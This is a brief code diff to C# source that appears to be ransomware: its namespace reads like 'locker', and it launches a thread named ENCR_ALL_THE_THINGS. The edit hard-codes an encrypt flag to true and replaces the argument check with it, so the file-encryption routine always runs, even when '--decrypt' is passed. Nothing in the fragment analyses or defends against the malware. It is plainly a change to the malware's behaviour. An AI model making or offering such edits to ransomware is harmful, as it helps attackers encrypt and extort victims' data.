@@ -21,7 +21,7 @@ namespace s0s_L_ckr
             Trace.Listeners.Add(new ConsoleTraceListener());
 
             string ops = (args.Length > 0 && args[0] == "--decrypt" ? "D" : "E");
-
+            bool encrypt = true;
             //Debug Generation
 #if DEBUG
             string fingerprint = null;
@@ -36,7 +36,7 @@ namespace s0s_L_ckr
             ThreadStart threadStart = null;
 
             //If given E parameter we Encrypt, Else D for Decrypt
-            if (args.Length == 0)
+            if (encrypt)
             {
                 threadStart = new ThreadStart(ENCR_ALL_THE_THINGS);
                 resultVal = 0; //Start of Encryption Thread
